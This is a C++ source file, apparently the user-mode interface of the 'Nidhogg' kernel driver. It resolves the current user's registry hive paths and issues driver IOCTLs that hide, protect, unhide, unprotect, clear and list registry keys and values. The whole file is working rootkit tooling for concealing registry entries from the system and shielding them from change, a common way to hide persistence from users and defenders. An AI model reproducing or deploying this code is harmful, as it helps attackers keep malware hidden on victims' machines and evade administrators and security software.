#include "pch.h"
#include "Nidhogg.h"

std::wstring NidhoggInterface::GetHKCUPath() {
	std::wstring fullUsername = HKU_HIVE;
	WCHAR username[MAX_PATH];
	DWORD usernameSize = MAX_PATH;
	wchar_t* domain;
	SID* sid;
	LPWSTR stringSid;
	SID_NAME_USE sidUse;
	DWORD sidSize = 0;
	DWORD domainSize = 0;

	if (!GetUserName(username, &usernameSize)) {
		return fullUsername;
	}

	if (LookupAccountName(0, username, 0, &sidSize, 0, &domainSize, &sidUse) == 0) {
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			return fullUsername;
	}

	sid = (SID*)LocalAlloc(LMEM_FIXED, sidSize);

	if (sid == 0) {
		return fullUsername;
	}
	domain = (wchar_t*)LocalAlloc(LMEM_FIXED, domainSize);

	if (domain == 0) {
		LocalFree(sid);
		return fullUsername;
	}

	if (LookupAccountName(0, username, sid, &sidSize, (LPWSTR)domain, &domainSize, &sidUse) == 0) {
		LocalFree(sid);
		LocalFree(domain);
		return fullUsername;
	}

	if (!ConvertSidToStringSid(sid, &stringSid)) {
		LocalFree(sid);
		LocalFree(domain);
		return fullUsername;
	}

	LocalFree(sid);
	LocalFree(domain);

	fullUsername.append(L"\\");
	fullUsername.append(stringSid);
	return fullUsername;
}

std::wstring NidhoggInterface::GetHKCRUserPath() {
	std::wstring userClassesPath = HKU_HIVE;
	WCHAR username[MAX_PATH];
	DWORD usernameSize = MAX_PATH;
	wchar_t* domain;
	SID* sid;
	LPWSTR stringSid;
	SID_NAME_USE sidUse;
	DWORD sidSize = 0;
	DWORD domainSize = 0;

	if (!GetUserName(username, &usernameSize)) {
		return L"";
	}

	if (LookupAccountName(0, username, 0, &sidSize, 0, &domainSize, &sidUse) == 0) {
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			return L"";
	}

	sid = (SID*)LocalAlloc(LMEM_FIXED, sidSize);
	if (sid == 0) {
		return L"";
	}
	domain = (wchar_t*)LocalAlloc(LMEM_FIXED, domainSize);
	if (domain == 0) {
		LocalFree(sid);
		return L"";
	}

	if (LookupAccountName(0, username, sid, &sidSize, (LPWSTR)domain, &domainSize, &sidUse) == 0) {
		LocalFree(sid);
		LocalFree(domain);
		return L"";
	}

	if (!ConvertSidToStringSid(sid, &stringSid)) {
		LocalFree(sid);
		LocalFree(domain);
		return L"";
	}

	LocalFree(sid);
	LocalFree(domain);

	userClassesPath.append(L"\\");
	userClassesPath.append(stringSid);
	userClassesPath.append(L"_Classes");
	return userClassesPath;
}

std::wstring NidhoggInterface::ParseRegistryKey(wchar_t* key) {
	std::wstring result = key;

	if (result.find(HKLM) != std::wstring::npos) {
		result.replace(0, 18, HKLM_HIVE);
	}
	else if (result.find(HKLM_SHORT) != std::wstring::npos) {
		result.replace(0, 4, HKLM_HIVE);
	}
	else if (result.find(HKCR) != std::wstring::npos) {
		std::wstring hkcrUserPath = GetHKCRUserPath();
		if (!hkcrUserPath.empty()) {
			result.replace(0, 17, hkcrUserPath);
		} else {
			result.replace(0, 17, HKCR_HIVE);
		}
	}
	else if (result.find(HKCR_SHORT) != std::wstring::npos) {
		std::wstring hkcrUserPath = GetHKCRUserPath();
		if (!hkcrUserPath.empty()) {
			result.replace(0, 4, hkcrUserPath);
		} else {
			result.replace(0, 4, HKCR_HIVE);
		}
	}
	else if (result.find(HKU) != std::wstring::npos) {
		result.replace(0, 10, HKU_HIVE);
	}
	else if (result.find(HKU_SHORT) != std::wstring::npos) {
		result.replace(0, 3, HKU_HIVE);
	}
	else if (result.find(HKCU) != std::wstring::npos) {
		std::wstring hkcuPath = GetHKCUPath();

		if (hkcuPath.compare(HKU_HIVE) == 0)
			return L"";
		result.replace(0, 17, hkcuPath);
	}
	else if (result.find(HKCU_SHORT) != std::wstring::npos) {
		std::wstring hkcuPath = GetHKCUPath();

		if (hkcuPath.compare(HKU_HIVE) == 0)
			return L"";
		result.replace(0, 4, hkcuPath);
	}
	else {
		return L"";
	}
	return result;
}

NidhoggErrorCodes NidhoggInterface::RegistryProtectKey(wchar_t* key) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	item.Type = RegItemType::RegProtectedKey;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryHideKey(wchar_t* key) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	item.Type = RegItemType::RegHiddenKey;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryProtectValue(wchar_t* key, wchar_t* valueName) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
	item.Type = RegItemType::RegProtectedValue;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryHideValue(wchar_t* key, wchar_t* valueName) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
	item.Type = RegItemType::RegHiddenValue;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryUnprotectKey(wchar_t* key) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	item.Type = RegItemType::RegProtectedKey;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_UNPROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryUnhideKey(wchar_t* key) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	item.Type = RegItemType::RegHiddenKey;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_UNPROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryUnprotectValue(wchar_t* key, wchar_t* valueName) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
	item.Type = RegItemType::RegProtectedValue;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_UNPROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryUnhideValue(wchar_t* key, wchar_t* valueName) {
	DWORD returned;
	RegItem item{};

	std::wstring kernelSyntaxRegistryKey = this->ParseRegistryKey(key);

	if (kernelSyntaxRegistryKey.empty() || wcslen(kernelSyntaxRegistryKey.data()) > REG_KEY_LEN || wcslen(valueName) > REG_VALUE_LEN)
		return NIDHOGG_GENERAL_ERROR;

	wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
	wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
	item.Type = RegItemType::RegHiddenValue;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_UNPROTECT_REGITEM,
		&item, sizeof(item),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RegistryClearAll() {
	DWORD returned;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_CLEAR_REGITEMS,
		nullptr, 0, nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

std::vector<std::wstring> NidhoggInterface::RegistryQueryProtectedKeys() {
	RegItem result{};
	std::vector<std::wstring> keys;
	int amountOfKeys = 0;
	DWORD returned;

	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegProtectedKey;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr)) {

		keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
		return keys;
	}

	amountOfKeys = result.RegItemsIndex;

	if (amountOfKeys == 0)
		return keys;

	keys.push_back(std::wstring(result.KeyPath));
	result.KeyPath[0] = L'\0';

	for (int i = 1; i < amountOfKeys; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {

			keys.clear();
			keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
			return keys;
		}

		keys.push_back(std::wstring(result.KeyPath));
		result.KeyPath[0] = L'\0';
	}

	return keys;
}

std::vector<std::wstring> NidhoggInterface::RegistryQueryHiddenKeys() {
	DWORD returned;
	RegItem result{};
	std::vector<std::wstring> keys;
	int amountOfKeys = 0;
	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegHiddenKey;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr)) {

		keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
		return keys;
	}

	amountOfKeys = result.RegItemsIndex;

	if (amountOfKeys == 0)
		return keys;

	keys.push_back(std::wstring(result.KeyPath));
	result.KeyPath[0] = L'\0';

	for (int i = 1; i < amountOfKeys; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {

			keys.clear();
			keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
			return keys;
		}

		keys.push_back(std::wstring(result.KeyPath));
		result.KeyPath[0] = L'\0';
	}

	return keys;
}

RegistryQueryResult NidhoggInterface::RegistryQueryProtectedValues() {
	DWORD returned;
	RegItem result{};
	RegistryQueryResult queryResult{};
	int amountOfValues = 0;
	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegProtectedValue;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr)) {

		queryResult.Values.clear();
		queryResult.Values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
		return queryResult;
	}

	amountOfValues = result.RegItemsIndex;

	if (amountOfValues == 0)
		return queryResult;

	queryResult.Keys.push_back(std::wstring(result.KeyPath));
	queryResult.Values.push_back(std::wstring(result.ValueName));
	result.KeyPath[0] = L'\0';
	result.ValueName[0] = L'\0';

	for (int i = 1; i < amountOfValues; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {

			queryResult.Values.clear();
			queryResult.Keys.clear();
			queryResult.Values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
			return queryResult;
		}

		queryResult.Keys.push_back(std::wstring(result.KeyPath));
		queryResult.Values.push_back(std::wstring(result.ValueName));
		result.KeyPath[0] = L'\0';
		result.ValueName[0] = L'\0';
	}

	return queryResult;
}

RegistryQueryResult NidhoggInterface::RegistryQueryHiddenValues() {
	DWORD returned;
	RegItem result{};
	RegistryQueryResult queryResult{};
	int amountOfValues = 0;
	result.RegItemsIndex = 0;
	result.Type = RegItemType::RegHiddenValue;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
		&result, sizeof(result),
		&result, sizeof(result), &returned, nullptr)) {

		queryResult.Values.clear();
		queryResult.Values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
		return queryResult;
	}

	amountOfValues = result.RegItemsIndex;

	if (amountOfValues == 0)
		return queryResult;

	queryResult.Keys.push_back(std::wstring(result.KeyPath));
	queryResult.Values.push_back(std::wstring(result.ValueName));
	result.KeyPath[0] = L'\0';
	result.ValueName[0] = L'\0';

	for (int i = 1; i < amountOfValues; i++) {
		result.RegItemsIndex = i;

		if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_REGITEMS,
			nullptr, 0,
			&result, sizeof(result), &returned, nullptr)) {

			queryResult.Values.clear();
			queryResult.Keys.clear();
			queryResult.Values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
			return queryResult;
		}

		queryResult.Keys.push_back(std::wstring(result.KeyPath));
		queryResult.Values.push_back(std::wstring(result.ValueName));
		result.KeyPath[0] = L'\0';
		result.ValueName[0] = L'\0';
	}

	return queryResult;
}
